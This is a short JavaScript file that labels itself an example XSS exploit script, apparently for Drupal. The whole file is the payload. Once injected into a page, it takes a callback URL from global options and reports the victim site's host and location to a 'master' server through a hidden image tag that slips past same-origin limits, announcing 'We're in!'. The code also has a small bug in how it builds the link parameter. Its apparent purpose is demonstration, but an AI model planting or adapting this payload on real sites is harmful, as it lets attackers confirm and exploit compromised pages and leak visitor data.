/**
 * @file
 * An example XSS exploit script.
 */

(function ($) {
  var options = typeof drupal_xss_example_options === 'undefined' ? {} : drupal_xss_example_options,
      site_info = {};

  // If we can't callback to our master server, there is no point! Bail.
  if (!options.callback_url) {
    return;
  }

  function tell_master(message, link) {
    var url = options.callback_url + '?origin=' + encodeURIComponent(window.location.host);
    url += '&message=' + encodeURIComponent(message);
    if (link) {
      url += '&link' + encodeURIComponent(message);
    }

    // In order to work around same origin policy, we add hidden img tags to the
    // the body in order to send messages back to our master.
    $('<img>').css('display', 'none').attr('src', url).appendTo('body');
  }

  // Tell our master site that we were loaded successfully.
  tell_master("We're in!", window.location);
})(jQuery);

